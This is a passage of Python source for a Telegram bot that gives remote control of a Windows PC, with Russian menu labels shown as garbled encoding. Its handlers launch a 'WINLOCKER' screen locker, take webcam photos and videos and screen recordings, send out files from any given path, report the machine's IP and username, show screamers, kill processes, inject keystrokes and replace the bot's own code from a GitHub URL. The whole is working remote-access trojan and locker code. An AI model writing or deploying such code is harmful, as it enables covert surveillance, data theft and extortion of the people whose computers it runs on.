        bot.send_message(message.chat.id, "‚õî –í–≤–æ–¥ –∑–∞–º–æ—Ä–æ–∂–µ–Ω –Ω–∞ 10 —Å–µ–∫—É–Ω–¥!")

    elif message.text == "üåê –ü–æ–∏—Å–∫ –≤ –±—Ä–∞—É–∑–µ—Ä–µ":
        bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –∑–∞–ø—Ä–æ—Å:")
        user_state[message.chat.id] = "search"



    elif message.text == "‚ñ∂Ô∏è –ó–∞–ø—É—Å—Ç–∏—Ç—å Winlockerüîê":
        if script_thread and script_thread.is_alive():
            bot.send_message(message.chat.id, "üîê WINLOCKER —É–∂–µ —Ä–∞–±–æ—Ç–∞–µ—Ç ‚ö†Ô∏è")
        else:
            script_stop_event.clear()
            script_thread = threading.Thread(target=kiosk_gui, args=(script_stop_event, PASSWORD), daemon=True)
            script_thread.start()
            bot.send_message(message.chat.id, "üîê WINLOCKER –∑–∞–ø—É—â–µ–Ω ‚úÖ")

    elif message.text == "‚èπ –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å WINLOCKERüîê":
        if script_thread and script_thread.is_alive():
            script_stop_event.set()
            bot.send_message(message.chat.id, "‚èπ WINLOCKER –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
        else:
            bot.send_message(message.chat.id, "‚èπ WINLOCKER –Ω–µ –∑–∞–ø—É—â–µ–Ω")

    elif message.text == "‚è© –û–±–Ω–æ–≤–∏—Ç—å –±–æ—Ç–∞":
        if message.chat.id != ADMIN_ID:
            bot.send_message(message.chat.id, "‚õî –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.")
            return

        bot.send_message(message.chat.id, "‚ôªÔ∏è –ü—Ä–æ–≤–µ—Ä—è—é –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è...")

        try:
            # URL —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è —Å –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ–º
            repo_url = "https://raw.githubusercontent.com/RBXLU/pccontrol/main/bot.py"
            response = requests.get(repo_url)

            if response.status_code == 200:
                # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ä–µ–∑–µ—Ä–≤–Ω—É—é –∫–æ–ø–∏—é —Ç–µ–∫—É—â–µ–≥–æ —Ñ–∞–π–ª–∞
                current_file = os.path.abspath(__file__)
                backup_file = current_file + ".bak"
                try:
                    os.rename(current_file, backup_file)
                    bot.send_message(message.chat.id, "‚úÖ –†–µ–∑–µ—Ä–≤–Ω–∞—è –∫–æ–ø–∏—è —Å–æ–∑–¥–∞–Ω–∞.")
                except Exception as e:
                    bot.send_message(message.chat.id, f"‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å —Ä–µ–∑–µ—Ä–≤–Ω—É—é –∫–æ–ø–∏—é: {e}")
                    return

                # –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ–±–Ω–æ–≤–ª—ë–Ω–Ω—ã–π —Ñ–∞–π–ª
                try:
                    with open(current_file, "wb") as f:
                        f.write(response.content)
                    bot.send_message(message.chat.id, "‚úÖ –ë–æ—Ç —É—Å–ø–µ—à–Ω–æ –æ–±–Ω–æ–≤–ª—ë–Ω! –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞—é...")
                    restart_bot()
                except Exception as e:
                    # –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ä–µ–∑–µ—Ä–≤–Ω—É—é –∫–æ–ø–∏—é –≤ —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏
                    os.rename(backup_file, current_file)
                    bot.send_message(message.chat.id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏: {e}. –†–µ–∑–µ—Ä–≤–Ω–∞—è –∫–æ–ø–∏—è –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞.")
            else:
                bot.send_message(message.chat.id, f"‚ö†Ô∏è –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ. –ö–æ–¥ –æ—Ç–≤–µ—Ç–∞: {response.status_code}")
        except Exception as e:
            bot.send_message(message.chat.id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π: {e}")

    elif message.text == "Meme spam":
        bot.send_message(message.chat.id, "–°–ø–∞–º –º–µ–º–∞–º–∏ –∑–∞–ø—É—â–µ–Ω!")
        local_meme_spam(folder=MEME_DIR, count=5, show_time=1.0)

    elif message.text == "üìÇ –û—Ç–∫—Ä—ã—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ":
        bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –∏–º—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è:")
        user_state[message.chat.id] = "open_app"

    elif message.text == "‚ùå –ó–∞–∫—Ä—ã—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ":
        bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞:")
        user_state[message.chat.id] = "close_app"

    elif message.text == "‚å®Ô∏è –ù–∞–ø–µ—á–∞—Ç–∞—Ç—å —Ç–µ–∫—Å—Ç":
        bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –¥–ª—è –ø–µ—á–∞—Ç–∏:")
        user_state[message.chat.id] = "type_text"

    elif message.text == "üñ± –ü–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å –º—ã—à—å":
        bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ X Y (–Ω–∞–ø—Ä–∏–º–µ—Ä: 500 300):")
        user_state[message.chat.id] = "move_mouse"

    elif message.text == "Black screen":
        bot.send_message(message.chat.id, "–ß–µ—Ä–Ω—ã–π —ç–∫—Ä–∞–Ω –∑–∞–ø—É—â–µ–Ω!")
        local_black_screen(duration=5)
        bot.send_message(message.chat.id, "‚úÖ Black screen –∑–∞–ø—É—â–µ–Ω –Ω–∞ —Ö–æ—Å—Ç–µ.")

    elif message.text == "üí¨ –°–æ–æ–±—â–µ–Ω–∏–µ":
        bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è:")
        user_state[message.chat.id] = "send_message"

    elif message.text == "üöÄ –ü–æ–¥–¥–µ—Ä–∂–∞—Ç—å –∞–≤—Ç–æ—Ä–∞":
        bot.send_message(message.chat.id, "–ï—Å–ª–∏ –≤–∞–º –Ω—Ä–∞–≤–∏—Ç—Å—è —ç—Ç–æ—Ç –±–æ—Ç, –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–¥–¥–µ—Ä–∂–∞—Ç—å –∞–≤—Ç–æ—Ä–∞ –æ—Ç–ø—Ä–∞–≤–∏–≤ –¥–æ–Ω–∞—Ç –Ω–∞ –∫–∞—Ä—Ç—É:\n\nüí≥ 4441 1144 3356 7409\n\n–ó–∞—Ä–∞–Ω–µ–µ c–ø–∞—Å–∏–±–æ –≤–∞—à—É –ø–æ–¥–¥–µ—Ä–∂–∫—É!")

    elif message.text == "üñ• –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö":
        os.system("shutdown /s /t 10")
        bot.send_message(message.chat.id, "‚è≥ –í—ã–∫–ª—é—á–µ–Ω–∏–µ —á–µ—Ä–µ–∑ 10 —Å–µ–∫—É–Ω–¥...")

    elif message.text == "üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö":
        os.system("shutdown /r /t 10")
        bot.send_message(message.chat.id, "‚è≥ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ —á–µ—Ä–µ–∑ 10 —Å–µ–∫—É–Ω–¥...")

    elif message.text == "üîí –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –ü–ö":
        os.system("rundll32.exe user32.dll,LockWorkStation")
        bot.send_message(message.chat.id, "üîí –ü–ö –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω")

    elif message.text == "‚õî –û—Ç–º–µ–Ω–∞ –≤—ã–∫–ª—é—á–µ–Ω–∏—è":
        os.system("shutdown /a")
        bot.send_message(message.chat.id, "‚ùå –í—ã–∫–ª—é—á–µ–Ω–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ")

    elif message.text == "üõë –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –±–æ—Ç–∞":
        bot.send_message(message.chat.id, "üõë –ë–æ—Ç –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
        os._exit(0)

    elif message.text == "‚å®Ô∏è –ì–æ—Ä—è—á–∏–µ –∫–ª–∞–≤–∏—à–∏":
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("Ctrl+C", "Alt+F4", "Win+D", "üîô –ù–∞–∑–∞–¥")
        bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –∫–æ–º–±–∏–Ω–∞—Ü–∏—é:", reply_markup=markup)

    elif message.text in ["Ctrl+C", "Alt+F4", "Win+D", "üîô –ù–∞–∑–∞–¥"]:
        if message.text == "Ctrl+C":
            pyautogui.hotkey('ctrl', 'c')
        elif message.text == "Alt+F4":
            pyautogui.hotkey('alt', 'f4')
        elif message.text == "Win+D":
            pyautogui.hotkey('win', 'd')
        if message.text == "üîô –ù–∞–∑–∞–¥":
            bot.send_message(message.chat.id, "–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é:", reply_markup=main_menu())
        else:
            bot.send_message(message.chat.id, f"‚úÖ –í—ã–ø–æ–ª–Ω–µ–Ω–æ {message.text}")

    elif message.text == "üñ• –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è":
        info = f"""
üíª –ò–º—è –ü–ö: {platform.node()}
üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {os.getlogin()}
üñ• –û–°: {platform.system()} {platform.release()}
üåê IP: {socket.gethostbyname(socket.gethostname())}
‚è± Uptime: {int(time.time() - psutil.boot_time())} —Å–µ–∫—É–Ω–¥
‚ö° CPU: {psutil.cpu_percent()}%
üíæ RAM: {psutil.virtual_memory().percent}%
üìÄ –î–∏—Å–∫–∏: {', '.join([d.device for d in psutil.disk_partitions()])}
"""
        bot.send_message(message.chat.id, info)

    elif message.text == "üëª –°–∫—Ä–∏–º–µ—Ä":
        try:
            show_screamer()
        except:
            pass
        bot.send_message(message.chat.id, "üëª –°–∫—Ä–∏–º–µ—Ä —Å—Ä–∞–±–æ—Ç–∞–ª!")

    elif message.text == "üîä –í–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫":
        try:
            ctypes.windll.winmm.waveOutSetVolume(0, 0xFFFF)
            bot.send_message(message.chat.id, "üîä –ó–≤—É–∫ –≤–∫–ª—é—á—ë–Ω (–≥—Ä–æ–º–∫–æ—Å—Ç—å 100%)")
        except Exception as e:
            bot.send_message(message.chat.id, f"‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –≤–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫: {e}")\
                
    elif message.text == "üîá –û—Ç–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫":
        try:
            # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –≥—Ä–æ–º–∫–æ—Å—Ç—å –Ω–∞ 0 (–≤–ª–∏—è–µ—Ç –Ω–∞ waveOut —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞)
            ctypes.windll.winmm.waveOutSetVolume(0, 0x0000)
            bot.send_message(message.chat.id, "üîá –ó–≤—É–∫ –æ—Ç–∫–ª—é—á—ë–Ω (–≥—Ä–æ–º–∫–æ—Å—Ç—å 0%)")
        except Exception as e:
            bot.send_message(message.chat.id, f"‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫: {e}")

    elif message.text == "üì∑ –§–æ—Ç–æ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã":
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                bot.send_message(message.chat.id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å –≤–µ–±-–∫–∞–º–µ—Ä—É")
            else:
                ret, frame = cap.read()
                cap.release()
                if not ret:
                    bot.send_message(message.chat.id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∫–∞–¥—Ä —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã")
                else:
                    import tempfile
                    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".jpg")
                    tmp_name = tmp.name
                    tmp.close()
                    cv2.imwrite(tmp_name, frame)
                    with open(tmp_name, "rb") as img:
                        bot.send_photo(message.chat.id, img)
                    try:
                        os.remove(tmp_name)
                    except Exception:
                        pass
        except Exception as e:
            bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å—ä—ë–º–∫–µ: {e}")

    elif message.text == "üìπ –í–µ–±–∫–∞–º–µ—Ä–∞ 8 —Å–µ–∫":
        bot.send_message(message.chat.id, "–ó–∞–ø–∏—Å—å –≤–µ–±–∫–∞–º–µ—Ä—ã...")
        filename = "webcam.mp4"
        if record_webcam(filename, duration=8):
            with open(filename, "rb") as vid:
                bot.send_video(message.chat.id, vid)
        else:
            bot.send_message(message.chat.id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø–∏—Å–∞—Ç—å –≤–∏–¥–µ–æ")
            
    elif message.text == "üîä –ì—Ä–æ–º–∫–æ—Å—Ç—å 100%":
        try:
            devices = ctypes.windll.winmm.waveOutGetNumDevs()
            ctypes.windll.winmm.waveOutSetVolume(0, 0xFFFF)
            bot.send_message(message.chat.id, "üîä –ì—Ä–æ–º–∫–æ—Å—Ç—å –≤—ã—Å—Ç–∞–≤–ª–µ–Ω–∞ –Ω–∞ 100%")
        except Exception as e:
            bot.send_message(message.chat.id, f"‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –∏–∑–º–µ–Ω–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å: {e}")

    elif message.text == "üñ± –õ–µ–≤—ã–π –∫–ª–∏–∫":
        pyautogui.click()
        bot.send_message(message.chat.id, "üñ± –õ–µ–≤—ã–π –∫–ª–∏–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω")
    elif message.text == "üñ± –ü—Ä–∞–≤—ã–π –∫–ª–∏–∫":
        pyautogui.click(button='right')
        bot.send_message(message.chat.id, "üñ± –ü—Ä–∞–≤—ã–π –∫–ª–∏–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω")

    # --- –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–æ—Å—Ç–æ—è–Ω–∏–π ---
    elif user_state.get(message.chat.id) == "search":
        webbrowser.open(f"https://www.google.com/search?q={message.text}")
        bot.send_message(message.chat.id, f"üåê –û—Ç–∫—Ä—ã–ª –ø–æ–∏—Å–∫: {message.text}")
        user_state[message.chat.id] = None
    elif user_state.get(message.chat.id) == "open_app":
        try:
            os.startfile(message.text)
            bot.send_message(message.chat.id, f"‚úÖ –û—Ç–∫—Ä—ã–ª {message.text}")
        except Exception as e:
            bot.send_message(message.chat.id, f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {e}")
        user_state[message.chat.id] = None
    elif user_state.get(message.chat.id) == "close_app":
        closed = False
        for proc in psutil.process_iter(attrs=["pid", "name"]):
            if message.text.lower() in proc.info["name"].lower():
                proc.kill()
                bot.send_message(message.chat.id, f"‚ùå –ó–∞–∫—Ä—ã–ª {proc.info['name']}")
                closed = True
        if not closed:
            bot.send_message(message.chat.id, "‚ö†Ô∏è –ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ")
        user_state[message.chat.id] = None
    elif user_state.get(message.chat.id) == "type_text":
        pyautogui.typewrite(message.text)
        bot.send_message(message.chat.id, "‚å®Ô∏è –ù–∞–ø–µ—á–∞—Ç–∞–ª —Ç–µ–∫—Å—Ç")
        user_state[message.chat.id] = None
    elif user_state.get(message.chat.id) == "move_mouse":
        try:
            x, y = map(int, message.text.split())
            pyautogui.moveTo(x, y, duration=0.5)
            bot.send_message(message.chat.id, f"üñ± –ü–µ—Ä–µ–º–µ—Å—Ç–∏–ª –º—ã—à—å –≤ {x},{y}")
        except:
            bot.send_message(message.chat.id, "‚ö†Ô∏è –í–≤–µ–¥–∏—Ç–µ X Y –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ (–Ω–∞–ø—Ä–∏–º–µ—Ä: 500 300)")
        user_state[message.chat.id] = None
    elif user_state.get(message.chat.id) == "send_message":
        pyautogui.alert(message.text)
        bot.send_message(message.chat.id, "üì© –°–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–∫–∞–∑–∞–Ω–æ")
        user_state[message.chat.id] = None

    elif message.text == "üìÅ –°–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤":
        files = os.listdir(BASE_DIR)
        files_str = "\n".join(files)
        bot.send_message(message.chat.id, f"–§–∞–π–ª—ã –≤ –ø–∞–ø–∫–µ:\n{files_str}")

    elif message.text == "üì§ –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–∞–π–ª":
        bot.send_message(
            message.chat.id,
            "–í–≤–µ–¥–∏ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, C:\\Users\\–ò–º—è\\Desktop\\file.txt):"
        )
        user_state[message.chat.id] = "send_file"
        return

    if user_state.get(message.chat.id) == "send_file":
        filepath = message.text.strip()
        if os.path.isfile(filepath):
            try:
                with open(filepath, "rb") as f:
                    bot.send_document(message.chat.id, f)
                bot.send_message(message.chat.id, "‚úÖ –§–∞–π–ª –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω")
            except Exception as e:
                bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–∞–π–ª–∞: {e}")
        else:
            bot.send_message(message.chat.id, "‚ùå –§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω. –ü—Ä–æ–≤–µ—Ä—å –ø—É—Ç—å –∏ –ø–æ–ø—Ä–æ–±—É–π —Å–Ω–æ–≤–∞.")
        user_state[message.chat.id] = None
        return

    elif message.text == "üé• –°–∫—Ä–∏–Ω–∫–∞—Å—Ç 10 —Å–µ–∫":
        bot.send_message(message.chat.id, "–ó–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞ 10 —Å–µ–∫—É–Ω–¥...")
        import numpy as np
        import cv2

        filename = "screencast.mp4"
        screen = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter(filename, fourcc, 10.0, screen)
        start = time.time()
        while time.time() - start < 10:
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(frame)
        out.release()
        with open(filename, "rb") as f:
            bot.send_video(message.chat.id, f)
        bot.send_message(message.chat.id, "üé• –°–∫—Ä–∏–Ω–∫–∞—Å—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω")

if __name__ == "__main__":
    bot.polling(none_stop=True)
